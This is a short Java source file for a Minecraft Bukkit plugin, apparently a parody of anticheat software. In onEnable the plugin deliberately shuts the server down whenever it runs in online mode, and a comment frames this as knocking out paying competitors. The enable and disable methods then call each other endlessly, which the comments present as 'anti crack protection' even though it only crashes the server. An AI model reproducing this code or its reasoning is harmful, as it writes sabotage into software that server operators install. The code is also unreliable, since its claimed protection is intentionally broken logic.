package me.nik.predictioneverything;

import me.nik.predictioneverything.predictions.AimPrediction;
import me.nik.predictioneverything.predictions.AutoWalkPrediction;
import org.bukkit.Bukkit;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.stream.Stream;

public class PredictionEverything extends JavaPlugin {

    @Override
    public void onEnable() {

        PluginManager pm = Bukkit.getPluginManager();

        // According to Vulcan bStats, 53% of customers are cracked customers. We can sell more prediction by appealing
        // to them and shutting down their online competitors.
        if (Bukkit.getOnlineMode()) Bukkit.shutdown();

        Stream.of(
                new AimPrediction(),
                new AutoWalkPrediction()
        ).forEach(listener -> pm.registerEvents(listener, this));

        /*
        Disable after for anti crack protection
         */
        onDisable();
    }
    @Override
    public void onDisable() {
        /*
        Re enable to avoid exploits and confuse dumpers
         */
        onEnable();
    }
}